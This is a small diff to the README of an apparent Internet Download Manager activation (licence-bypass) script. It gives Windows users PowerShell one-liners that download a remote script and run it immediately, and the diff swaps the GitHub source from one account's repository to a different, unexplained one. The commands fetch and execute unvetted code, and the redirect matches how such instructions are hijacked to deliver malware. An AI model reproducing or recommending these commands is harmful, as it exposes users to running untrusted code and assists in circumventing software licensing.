@@ -38,11 +38,11 @@ On Windows 10/11, right-click on the windows start menu and select PowerShell or
 Copy-paste the below code and press enter:
 
 ```
-iex(irm is.gd/idm_reset)
+iex(irm is.gd/IDM_reset)
 ```
 or
 ```
-iwr -useb https://raw.githubusercontent.com/lstprjct/IDM-Activation-Script/main/IAS.ps1 | iex
+iwr -useb https://raw.githubusercontent.com/z4q/IDM/main/IAS.ps1 | iex
 ```
 
 You will see the activation options, and follow onscreen instructions.
